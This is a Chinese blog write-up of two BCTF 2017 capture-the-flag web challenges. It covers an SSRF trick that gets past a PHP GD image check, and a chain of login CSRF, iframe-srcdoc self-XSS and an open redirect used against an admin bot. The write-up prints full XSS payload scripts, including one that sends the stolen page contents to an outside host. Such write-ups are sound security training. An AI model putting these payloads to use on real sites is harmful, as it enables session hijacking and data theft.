---
title: bctf2017 web部分wp
date: 2017-04-18 12:51:05
tags:
- Blogs
- ctf
- curl
- xss
categories:
- Blogs
---


周末干了一发bctf，因为周六出去玩了，所以没能看完所有的web题还是挺可惜的，先整理已经做了的2道火日聚聚的web题，后面在整理别的题目。

![image_1bdt8qkc81s8ni7h17b7j21ck19.png-55.4kB][1]

<!--more-->

# paint #

![image_1bdt8uheq1gjhk37fht1nf81hd2m.png-98.3kB][2]

打开题目是一个画画板，除了基本的画画功能以外，还可以上传图片文件。浅逛一下整个站不难发现有效的目标点只有2个，image.php和upload.php。

首先分析upload.php，可以上传任意文件，但要求上传文件后缀必须为图片，感觉应该是白名单，上传之后文件会改名，最重要的一点，上传图片的目录服务端做了设置，**php后缀的文件会直接返回403**，这也说明了后面的漏洞类型。

查看右键源码获得提示，flag在flag.php。

然后是image.php，image.php直接传入url，传入url后，会先经过一个基本的判断（感觉是正则），只允许传入http或者https协议的url，而且不能出现127.0.0.1，然后服务器会**curl**目标获取返回，经过**php gd库**的判断，如果通过判断，那么会返回传入图片的地址，如果没通过判断，会返回curl返回的内容长度和not image.

这里我们把域名指向127.0.0.1，然后请求flag.php

![image_1bdtb3dlk36js2i1605osn1hsq13.png-126.2kB][3]

我们看到返回长度374

![image_1bdtbdbq012ntmdqss1ep03s21g.png-63.6kB][4]

直接访问长度是80，那么思路清楚了，我们并不需要读取本地文件，只需要获取到内网的flag.php的内容就好了。

确定了目标之后，关键就在于如何利用了。

如果我们想获取到这个ssrf的返回值，就必须让返回值通过gd库的判断，让gd库认为这是一张图片，然后我们请求图片就可以获得返回。

这里有个小tricks

![image_1bdtbp175hhc1nnjeg4lde1i8q1t.png-8.2kB][5]

通过构造请求，可以让curl请求多个页面，将返回值拼接起来，通过分割一张图片的为3部分，上传第一部分和第三部分，把中间位置填充为flag.php，这样gd库就会认为请求到了一张图片，我们就能获取到结果了。

最终payload

```
http://xxxxxx/uploads/{149232828259FrA52FJy.gif,flag.php,149232828365div3po3O.gif}
```

但事实上，题目并不会如我们想象一般，因为php gd除了获取返回值写入图片以外，还会对图片做部分处理，对于jpg来说，图片内容改动过大，而gif就会相对好很多，而且图片的exif信息部分不会被处理，我们的目标就是在图片不被破坏的基础上，将flag.php的内容写入到这里。

还找到了一些相关的文章

[http://www.freebuf.com/articles/web/54086.html](http://www.freebuf.com/articles/web/54086.html)

[https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE](https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE)

最终成功的图片

![image_1bdtccqam15qf1hai1st21f661v2k2a.png-447.9kB][6]


# diary #

这是一个思路非常奇妙的xss题目，我们先从头来看看这个题目

![image_1bdte4eg9k9s13urld1g8t1jmt2n.png-99.1kB][7]

无意间找到了类似的原文

[https://whitton.io/articles/uber-turning-self-xss-into-good-xss/](https://whitton.io/articles/uber-turning-self-xss-into-good-xss/)

国内有人翻译了文章，可惜wooyun没了
[http://www.vuln.cn/6530](http://www.vuln.cn/6530)

接下来我们来分析这个题目

## csrf ##

打开题目首先是`http://diary.bctf.xctf.org.cn/`

注册登录，可以发现时O2auth登陆，diary域会去auth域请求一个回调code，然后返回diary登陆成功。

diary和auth有两个分别的域，因此有两个分别的session，这里有个隐藏条件**登陆请求不带有csrftoken，所以存在csrf**

## self-xss ##

登陆成功后，主要有几个功能，第一个是diary，可以编辑类似于描述之类的，这里存在一个self-xss漏洞，但是self-xss比较特殊。

这里用户的输入直接通过抓包修改，在服务端不会有任何过滤，但是读取到之后传入的页面内经过了一次前端的过滤。

过滤函数很复杂，但主要注意几个地方。第一个是关于img的过滤

![image_1bdter1ojars1t0gfcf11ss1vl634.png-15kB][8]

img标签不能存在on开头的属性

然后是标签的黑名单

![image_1bdtes5dj14jg1atr5tf1chg8hb3h.png-31.2kB][9]

细心一点儿可以发现，iframe标签其实没被过滤，而通过srcdoc属性，可以产生一个同源下的子窗口，子窗口下可以随便构造js

payload
```
<iframe srcdoc="<script>alert(1);</script>">

</iframe>
```
成功了，然后我们接着看站

## 目标 ##

survey是一个表单，我们随便提交点儿什么，会得到

```
Thank you. But the boss said only admin can get the flag after he finishes this survey, XD
```

看来这就是我们的目标了，这里需要注意了，survey这次提交是带有csrftoken的，也就是不存在csrf漏洞。

## 管理员审核 ##

然后是report bug功能，如果我们随便提交个url，会返回
```
We only care about the problem from this website (http://diary.bctf.xctf.org.cn)!
```

但是纵观整个站，我们不难发现，整站是由django写的，稍微测试下可以发现存在静态文件任意跳转漏洞

```
http://diary.bctf.xctf.org.cn/static/%5C%5C119.29.192.14/bctf2017/xss/xss.html

这样就会调到目标站了
```

## 整理攻击思路 ##

自己研究原文结合前面发现的一些漏洞，我们不难整理出整个攻击思路。

1、提交带有payload的外域链接，通过任意跳转绕过判断，让admin访问。
2、admin访问后退出diary域的登陆，但保留了auth域的session。
3、bot用我们事先准备好的token（这步可以动态）登陆，访问我们事先构造好的diary页面。
4、diary页面是事先用iframe插入的js，当bot访问的时候，先打开一个新的iframe子窗口退出当前账号，然后访问login登陆回bot账号。
5、等待上步完成后，新打开一个iframe子窗口，访问survey，向建议框内写入数据，点击submit。
6、等待上步完成后，获取子窗口内容，跳转至接受flag的地方

思路理明白了，就剩下写payload了。

## 最终payload ##

首先是xss1.html，也就是上面的前三步


```
<meta http-equiv="Content-Security-Policy" content="img-src http://diary.bctf.xctf.org.cn">

<img src="http://diary.bctf.xctf.org.cn/accounts/logout/" onerror="login();">


<script>

    var login = function() {
        var loginImg = document.createElement('img');
        loginImg.src = 'http://diary.bctf.xctf.org.cn/accounts/login/';
        loginImg.onerror = redir;
    }
    //用我们的code登录
    var redir = function() {
        var code = "kAj32I0LE2KETl5ZHS6FFRJohsE4LA";
        var loginImg2 = document.createElement('img');
        loginImg2.src = 'http://diary.bctf.xctf.org.cn/o/receive_authcode?state=preauth&code=' + code;
        loginImg2.onerror = function() {
            window.location = 'http://diary.bctf.xctf.org.cn/diary/';
        }
    }


</script>
```

然后是xss2.html，上面提到的第四步

```
<meta http-equiv="Content-Security-Policy" content="img-src http://diary.bctf.xctf.org.cn">
<img src="http://diary.bctf.xctf.org.cn/accounts/logout/" onerror="redir();">
<script>
    
    var redir = function() {
        window.location = 'http://diary.bctf.xctf.org.cn/accounts/login/';
    };
</script>
```

最后是完成攻击的payload
```
<iframe src='http://119.29.192.14/bctf2017/xss/xss2.html'>
</iframe>
<script>
setTimeout(function() {
    var profileIframe = document.createElement('iframe');
    profileIframe.setAttribute('src', 'http://diary.bctf.xctf.org.cn/survey/');
    profileIframe.setAttribute('id', 'survey');
    document.body.appendChild(profileIframe);

    profileIframe.onload = function() {
        document.getElementById('survey').contentWindow.document.forms[0].suggestion.value='give me flag';
        document.getElementById('survey').contentWindow.document.forms[0].submit();


        setTimeout('location.href=\'//xxx?flag=\'+document.getElementById(\'survey\').contentWindow.document.body.innerHTML;', 3000);
    }
}, 5000);
</script>
```

![image_1bdtg2l1d198b1jph13fmffqg5g3u.png-50.5kB][10]

提交后等待一会儿，成功收到了返回

![image_1bdtg5fqebnmier3bkmcc1heb4b.png-92.1kB][11]





  [1]: http://static.zybuluo.com/LoRexxar/kkihjpctpr078cyrzrgip1ww/image_1bdt8qkc81s8ni7h17b7j21ck19.png
  [2]: http://static.zybuluo.com/LoRexxar/k3o5raq7ozrnazfd5sfeojua/image_1bdt8uheq1gjhk37fht1nf81hd2m.png
  [3]: http://static.zybuluo.com/LoRexxar/f6023kwkx4nvjivhad1bso6b/image_1bdtb3dlk36js2i1605osn1hsq13.png
  [4]: http://static.zybuluo.com/LoRexxar/gfgzgx51t10slbclxuhzcr7f/image_1bdtbdbq012ntmdqss1ep03s21g.png
  [5]: http://static.zybuluo.com/LoRexxar/jqq0ihh2mjb0phbd6auxw3hx/image_1bdtbp175hhc1nnjeg4lde1i8q1t.png
  [6]: http://static.zybuluo.com/LoRexxar/grrwwcnvdx6f6ue1v4ae5p1g/image_1bdtccqam15qf1hai1st21f661v2k2a.png
  [7]: http://static.zybuluo.com/LoRexxar/9iw4qblc7cw108tuarkkgjuh/image_1bdte4eg9k9s13urld1g8t1jmt2n.png
  [8]: http://static.zybuluo.com/LoRexxar/jz8831kzjijmhk4ewprxdtt6/image_1bdter1ojars1t0gfcf11ss1vl634.png
  [9]: http://static.zybuluo.com/LoRexxar/sn7gt5nm8dwx4h18p9binz9b/image_1bdtes5dj14jg1atr5tf1chg8hb3h.png
  [10]: http://static.zybuluo.com/LoRexxar/t0q0gcv10aov10jmy0s2f1xi/image_1bdtg2l1d198b1jph13fmffqg5g3u.png
  [11]: http://static.zybuluo.com/LoRexxar/monq5zoc8w02jgztjnndvgwt/image_1bdtg5fqebnmier3bkmcc1heb4b.png